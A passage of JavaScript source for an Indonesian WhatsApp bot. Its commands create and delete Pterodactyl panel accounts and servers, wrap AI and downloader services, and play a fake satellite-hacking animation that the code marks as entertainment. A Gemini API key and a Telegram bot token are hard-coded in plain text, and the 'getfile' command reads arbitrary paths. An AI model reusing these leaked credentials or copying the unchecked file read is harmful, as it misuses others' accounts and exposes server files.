 await bani.relayMessage(m.chat, carousel.message, { messageId: carousel.key.id });
 } catch (err) {
 console.error('❌ Error search ph:', err);
 m.reply('Terjadi kesalahan saat mengambil data.');
 }
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh Command :*

*.1gb-v2* username
*.1gb-v2* username,6283XX`)
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return m.reply(`*Contoh Command :*

*.1gb-v2* username
*.1gb-v2* username,6283XX`)
usernem = users.toLowerCase()
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
usernem = text.toLowerCase()
nomor = m.chat
}

var onWa = await bani.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}

let username = usernem.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(3).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await bani.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case 'getgist': {
 if (!text) return m.reply(`📌 Kirim ID atau URL Gist!\nContoh: .getgist 4c2db6dca3ee1e5f3eac53bd31c2f4d7`);

 const gistId = text.includes('gist.github.com')
 ? text.split('/').pop().split('?')[0]
 : text.trim();

 try {
 const res = await fetch(`https://api.github.com/gists/${gistId}`);
 if (!res.ok) throw `Gist tidak ditemukan atau private.`;

 const json = await res.json();
 const files = json.files;
 const firstFile = Object.values(files)[0];

 if (!firstFile || !firstFile.content) throw `Isi Gist kosong atau file tidak bisa dibaca.`;

 const namaFile = firstFile.filename;
 const isiFile = firstFile.content;
 const gistUrl = json.html_url;

 const output = `📂 *Gist ID:* ${gistId}\n` +
 `📄 *Nama File:* ${namaFile}\n\n` +
 `📜 *Isi:* \n${isiFile.slice(0, 10000)}\n`;

 await bani.sendMessage(m.chat, {
 text: output.trim(),
 footer: 'BotzNeww',
 interactiveButtons: [{
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: '📂 Copy Gist',
 copy_code: gistUrl
 })
 }]
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply(`❌ Gagal ambil Gist!\n📄 *Error:* ${err.message || err}`);
 }
}
break


case "hacksatelit": {
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms))

 const satelit = [
 "Starlink-77", "ISS (International Space Station)", "NASA Recon", "SatKom-1", 
 "MOSSAD-3", "GeoSat-X", "BlackBird v2", "Hubble-Telescope"
 ]
 const lokasi = [
 "Antartika", "Orbit LEO", "Atas wilayah Indonesia", "Samudra Pasifik", 
 "Atas Moskow", "Area 51", "Luar atmosfer", "Atas Afrika Tengah"
 ]
 const status = [
 "📦 Mengunduh paket nuklir...",
 "🔒 Membuka akses kontrol kamera satelit...",
 "🧬 Memindai struktur termal...",
 "🧲 Mengaktifkan mode stealth...",
 "📶 Menurunkan satelit ke ketinggian kritis...",
 "🚀 Mengubah lintasan satelit..."
 ]

 let target = satelit[Math.floor(Math.random() * satelit.length)]
 let lokasiNow = lokasi[Math.floor(Math.random() * lokasi.length)]

 await bani.sendMessage(m.chat, { text: `🔍 Mendeteksi satelit *${target}*...` }, { quoted: m })
 await delay(1500)
 await bani.sendMessage(m.chat, { text: `📡 Menghubungkan ke antena penguat sinyal...` }, { quoted: m })
 await delay(1500)
 await bani.sendMessage(m.chat, { text: `💻 Bypass firewall orbit...\n🧠 Mem-bypass enkripsi AES-256...` }, { quoted: m })
 await delay(1800)
 await bani.sendMessage(m.chat, { text: `🛰️ Terhubung ke *${target}*\n📶 Signal Locked: ✅\n💾 Mengambil data orbit...` }, { quoted: m })
 await delay(2000)

 for (let i = 0; i < 4; i++) {
 await delay(1500)
 await bani.sendMessage(m.chat, { text: status[Math.floor(Math.random() * status.length)] }, { quoted: m })
 }

 await delay(1800)
 await bani.sendMessage(m.chat, {
 text: `✅ *Sukses mengakses satelit ${target}*\n\n📍 Lokasi: ${lokasiNow}\n📡 Status: Aktif\n🕐 Waktu Server: ${new Date().toLocaleTimeString()}\n\n⚠️ Catatan: Ini hanya simulasi untuk hiburan.`,
 }, { quoted: m })
}
break


case "blackbox":
case "bb": {
 let prompt = text ? text : (m.quoted ? m.quoted.text : null);
 if(!prompt) return m.reply("Halo, Mau Bertanya Apa?");
 
 await m.reply("waitt");
 let anu = `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(prompt)}`;
 let res = await fetch(anu)
 let response = await res.json(); 
 let teks = `${response.data}`
 try {
 bani.sendMessage(m.chat, {text: teks}, {quoted: m})
 } catch (e) {
 console.log(e)
 await m.reply("Error")
 }
}
break





case 'aigen':
case 'aiimage': {
 if (!text) return m.reply(`🚨 Masukkan prompt gambar!\n\nContoh: .aigen anime girl with blue hair`);
 m.reply("🎨 Generating AI Image...");
 try {
 const axios = require("axios");
 async function generateImage(prompt) {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/"
 };
 let { data } = await axios.get(url, { headers });
 if (data && data.image_link) return { success: true, imageUrl: data.image_link };
 return { success: false, message: "❌ Gagal mendapatkan gambar!" };
 }
 let result = await generateImage(text);
 if (!result.success) return m.reply(result.message);
 await bani.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });
 await bani.sendMessage(m.chat, { 
 image: { url: result.imageUrl }, 
 caption: `🖼️ *AI Image Generator*\n\n🎨 *Prompt:* ${text}` 
 }, { quoted: m });
 m.reply("✅ Gambar berhasil dibuat!");
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat gambar!");
 }
}
break


case 'gemini': {
 if (!text && !m.quoted) return m.reply("• *Contoh:* .gemini selamat pagi");
 const { uploadFile } = require('cloudku-uploader');
 const { Buffer } = require('buffer');
 const { GoogleGenerativeAI } = require ("@google/generative-ai");
 const genAI = new GoogleGenerativeAI("AIzaSyDdfNNmvphdPdHSbIvpO5UkHdzBwx7NVm0");
 const geminiProModel = genAI.getGenerativeModel({ model: "gemini-1.5-pro" });
 const geminiFlashModel = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });

 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 let prompt = text || (m.quoted && m.quoted.text) || "";

 try {
 let responseText, imageUrl;

 if (mime) {
 // Proses upload gambar ke CloudkuImages
 let fileBuffer = await q.download();
 let ext = mime.split('/')[1] || 'bin';
 let fileName = `upload.${ext}`;

 let uploadResult = await uploadFile(fileBuffer, fileName);
 if (uploadResult.status !== "success") return m.reply("⚠️ Gagal mengunggah gambar!");

 imageUrl = uploadResult.url;

 // Proses AI dengan gambar
 const imageResp = await fetch(imageUrl).then(res => res.arrayBuffer());
 const imageBase64 = Buffer.from(imageResp).toString("base64");

 let imagePart = {
 inlineData: {
 data: imageBase64,
 mimeType: mime
 }
 };

 let result = await geminiProModel.generateContent([imagePart, prompt]);
 responseText = result.response.text();
 } else {
 // Proses teks biasa
 let result = await geminiFlashModel.generateContent(prompt);
 responseText = result.response.text();
 }

 if (!responseText) throw new Error("Response tidak valid dari API");

 bani.sendMessage(m.chat, {
 text: responseText,
 contextInfo: {
 externalAdReply: {
 title: 'GEMINI-PRO / VISION',
 thumbnailUrl: imageUrl || 'https://telegra.ph/file/4bae3d5130aabcbe94588.jpg',
 sourceUrl: 'https://gemini.google.com',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });

 } catch (e) {
 console.error(e);
 m.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
 }
}
break


case 'telesticker': {
 async function telestick(url) {
 let match = url.match(/https:\/\/t\.me\/addstickers\/([^\/\?#]+)/)
 if (!match) throw 'Invalid url'
 let { data: a } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getStickerSet?name=${match[1]}`)
 let stickers = await Promise.all(a.result.stickers.map(async v => {
 let { data: b } = await axios.get(`https://api.telegram.org/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/getFile?file_id=${v.file_id}`)
 return {
 emoji: v.emoji,
 is_animated: v.is_animated,
 image_url: `https://api.telegram.org/file/bot7935827856:AAGdbLXArulCigWyi6gqR07gi--ZPm7ewhc/${b.result.file_path}`
 }
 }))
 return { name: a.result.name, title: a.result.title, sticker_type: a.result.sticker_type, stickers }
 }
 
 try {
 if (!args[0]) return m.reply('Masukkan url sticker telegram')
 let res = await telestick(args[0])
 for (let v of res.stickers) {
 let { data } = await axios.get(v.image_url, { responseType: 'arraybuffer' })
 let sticker = new Sticker(data, { pack: res.title, author: 'Telegram', type: v.is_animated ? 'full' : 'default' })
 await bani.sendMessage(m.chat, await sticker.toMessage(), { quoted: m })
 }
 } catch (e) {
 m.reply(e.message)
 }
}
break








case "listakses": case "listaksesgc": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of premium) {
let name = (await bani.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
bani.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: m})
}
break


case "delakses": case "delaksesgc": {
if (!isCreator) return m.reply(mess.owner)
if (premium.length < 1) return m.reply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of premium) {
let name = (await bani.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return bani.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Server',
 sections: [
 {
 title: `List All Server`,
 rows: [...list] 
 }
 ]
 })
 }
 }
 ],
 footer: `BotzNeww`,
 headerType: 1,
 viewOnce: true,
 text: "Pilih Salah Satu Server\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
let input = text
if (text == "all") {
await premium.splice(0, premium.length)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
return m.reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!premium.includes(input)) return m.reply(`Grup ini bukan grup reseller panel!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus grup reseller panel ✅`)
}
break


case "addakses": case "addaksesgc": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
const input = m.chat
if (premium.includes(input)) return m.reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah grup reseller panel ✅`)
}
break


case "gptvideo": {
 try {
 if (!q) return m.reply(`*Contoh:* ${prefix}gptvideo A painting of a mountain during sunset`)

 let res = await fetch(`https://veloria-ui.vercel.app/ai/txt2video?prompt=${encodeURIComponent(q)}`)
 let json = await res.json()

 if (!json.status || !json.result) return m.reply("❌ Gagal membuat video dari prompt.")

 await bani.sendMessage(m.chat, {
 video: { url: json.result },
 caption: `🎥 *Video berhasil digenerate!*\n\n📌 Prompt: *${q}*`
 }, { quoted: m })

 } catch (err) {
 console.log(err)
 m.reply("❌ Terjadi kesalahan saat membuat video.")
 }
}
 break
        
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return m.reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak ada server panel!")
let messageText = "\n *乂 List Server Panel Pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n 📡 *${s.id} >> [ ${s.name} ]*
 *• Ram :* ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}
 *• CPU :* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}
 *• Disk :* ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}
 *• Created :* ${s.created_at.split("T")[0]}\n`
}
await bani.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break


case "deladmin": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply ("example: idnya")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Gagal menghapus akun!\nID user tidak ditemukan")
await m.reply(`Sukses menghapus akun admin panel *${capital(getid)}*`)
}
break








case "listadmin": {
if (!isCreator) return m.reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List Admin Panel Pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n 📡 *${i.attributes.id} >> [ ${i.attributes.first_name} ]*
 *• Nama :* ${i.attributes.first_name}
 *• Created :* ${i.attributes.created_at.split("T")[0]}\n`
})
await bani.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break


case "cadmin": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh Command :*

*.cadmin* username
*.cadmin* username,6283XX`)
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return m.reply(`*Contoh Command :*

*.cadmin* username
*.cadmin* username,6283XX`)
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = text.toLowerCase()
nomor = m.chat
}
var onWa = await bani.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
let username = usernem.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun admin panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `
*Berikut Detail Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ ${tanggal(Date.now())}*

*🌐* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await bani.sendMessage(orang, {text: teks}, {quoted: m})
}
break


case "delpanel": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m. reply ("example: idnya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Gagal menghapus server!\nID server tidak ditemukan")
await m.reply(`Sukses menghapus server panel *${capital(nameSrv)}*`)
}
break





case 'play': {
 try {
 let query = args.join(' ')
 if (!query) return m.reply('*Example :* .play Only We Know Speed Up')
 
 let searchResult = await yts(query)
 let video = searchResult.videos[0]
 
 let { data } = await axios.get('https://api.yogik.id/downloader/youtube', {
 params: { url: video.url, format: 'audio' },
 headers: { Accept: 'application/json' }
 })
 
 let result = data.result
 
 await bani.sendMessage(m.chat, {
 audio: { url: result.download_url },
 mimetype: 'audio/mpeg',
 ptt: false,
 contextInfo: {
 externalAdReply: {
 title: result.title,
 body: result.author_name,
 thumbnailUrl: result.thumbnail_url,
 sourceUrl: video.url,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m })
 
 } catch (e) {
 m.reply(e.message)
 }
}
break


case "getfile": {
 if (!isCreator) return m.reply('[ FITUR KHUSUS OWNER ]')
 if (!q) return m.reply("Masukkan nama file!\nContoh: getfile case.js")
 const filePath = path.join(__dirname, q)
 if (!fs.existsSync(filePath)) return m.reply("File tidak ditemukan!")
 const stat = fs.statSync(filePath)
 if (stat.isDirectory()) return m.reply("Itu folder, bukan file!")
 const mime = require("mime-types")
 const mimetype = mime.lookup(filePath) || 'application/octet-stream'
 const fileName = path.basename(filePath)
 await bani.sendMessage(m.sender, {
 document: fs.readFileSync(filePath),
 fileName,
 mimetype
 }, { quoted: m })
 if (m.chat !== m.sender) return m.reply("File berhasil dikirim ke private chat")
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb":
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb":
case "unlimited": case "unli": {
 if (!global.egg || !global.nestid || !global.loc || !global.domain || !global.apikey) {
 return m.reply("❌ Pengaturan panel belum lengkap! Cek `global.egg`, `nestid`, `loc`, `domain`, dan `apikey` di settings.js");
 }

 if (global.bannedPanel[m.sender]) {
 return m.reply("❌ Kamu telah dibanned dari fitur create panel.\nSilakan hubungi owner untuk unban.");
 }

 if (global.cooldownPanel[m.sender]) {
 global.bannedPanel[m.sender] = true
 bani.sendMessage(global.owner + "@s.whatsapp.net", {
 text: `⚠️ Pengguna ${m.sender.split("@")[0]} dibanned dari fitur panel karena spam saat cooldown.`
 })
 return m.reply("🚫 Kamu mencoba menggunakan fitur saat cooldown.\nAkunmu telah dibanned dari fitur ini.\nHubungi owner untuk unban.")
 }

 if (!isCreator && !isPremium) return m.reply("Fitur ini khusus Premium / Owner");
 if (!premium.includes(m.chat)) return m.reply('Grup ini belum diberi akses. Minta owner ketik *.addakses* di grup ini.')
 if (!text) return m.reply("example: nama,628XXXXXX");

 let [usernem, nomorhp] = text.split(",");
 if (!usernem || !nomorhp) return m.reply("example: nama,628XXXXXX");

 let nomor = nomorhp.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 usernem = usernem.toLowerCase();

 let onWa = await bani.onWhatsApp(nomor.split("@")[0]);
 if (onWa.length < 1) return m.reply("❌ Nomor target tidak terdaftar di WhatsApp!");

 const specs = {
 "1gb": { ram: "1000", disk: "1000", cpu: "40" },
 "2gb": { ram: "2000", disk: "1000", cpu: "60" },
 "3gb": { ram: "3000", disk: "2000", cpu: "80" },
 "4gb": { ram: "4000", disk: "2000", cpu: "100" },
 "5gb": { ram: "5000", disk: "3000", cpu: "120" },
 "6gb": { ram: "6000", disk: "3000", cpu: "140" },
 "7gb": { ram: "7000", disk: "4000", cpu: "160" },
 "8gb": { ram: "8000", disk: "4000", cpu: "180" },
 "9gb": { ram: "9000", disk: "5000", cpu: "200" },
 "10gb": { ram: "10000", disk: "5000", cpu: "220" },
 "unlimited": { ram: "0", disk: "0", cpu: "0" },
 "unli": { ram: "0", disk: "0", cpu: "0" }
 }

 const { ram, disk, cpu } = specs[command];
 const { egg, nestid, loc, domain, apikey } = global;

 const username = usernem
 const email = username + "@gmail.com"
 const name = capital(username) + " Server"
 const password = username + crypto.randomBytes(2).toString("hex")

 try {
 let res = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 },
 body: JSON.stringify({
 email,
 username,
 first_name: name,
 last_name: "Server",
 language: "en",
 password
 })
 });

 let data = await res.json();
 if (data.errors) return m.reply("❌ Gagal membuat user: " + JSON.stringify(data.errors[0], null, 2));
 let user = data.attributes;

 let f1 = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 }
 });
 let startup = (await f1.json()).attributes.startup;

 let f2 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey
 },
 body: JSON.stringify({
 name,
 description: tanggal(Date.now()),
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start"
 },
 limits: {
 memory: ram,
 swap: 0,
 disk,
 io: 500,
 cpu
 },
 feature_limits: {
 databases: 5,
 backups: 5,
 allocations: 5
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: []
 }
 })
 });

 let server = await f2.json();
 if (server.errors) return m.reply("❌ Gagal membuat server: " + JSON.stringify(server.errors[0], null, 2));

 let teks = `*Data Akun Panel Kamu 📦*

📡 *ID Server:* ${server.attributes.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}
🗓️ *Created:* ${user.created_at.split("T")[0]}

🌐 *Spesifikasi Server*
• RAM : ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
• Disk : ${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}
• CPU : ${cpu == "0" ? "Unlimited" : cpu + "%"}
• ${global.domain}

📝 *Note:*
- Masa aktif panel 1 bulan
- Simpan baik-baik data ini
- Garansi 15 hari (1x ganti)
- Harus ada bukti pembelian untuk klaim garansi`;

 await bani.sendMessage(nomor, {
 document: Buffer.from(teks, "utf-8"),
 fileName: "akunpanel.txt",
 mimetype: "text/plain",
 caption: teks
 }, { quoted: m });

 await bani.sendMessage(m.chat, {
 text: `✅ Akun panel *${username}* berhasil dibuat dan telah dikirim ke ${nomor.split("@")[0]}`,
 }, { quoted: m });

 global.cooldownPanel[m.sender] = true;
 setTimeout(() => {
 delete global.cooldownPanel[m.sender]
 }, 5 * 60 * 1000);

 } catch (e) {
 console.error(e);
 return m.reply("❌ Terjadi kesalahan internal saat membuat panel.");
 }
}
break

case "unbanress": {
 if (!isCreator) return m.reply(mess.owner)
 if (!text) return m.reply("Tag atau ketik nomornya!")

 let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 if (!global.bannedPanel[target]) return m.reply("User tidak dalam status banned.")

 delete global.bannedPanel[target]
 m.reply(`✅ Berhasil unban ${target} dari fitur create panel.`)
}
break
        
case "backup": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return m.reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `BotzUpdate`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await bani.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

case "menu": {
let teks = `
 *── I N F O R M A T I O N*
  » Botname : *${global.namabot}*
  » Version : *${global.botversion}*
  » Mode : *${bani.public ? "Public": "Self"}*
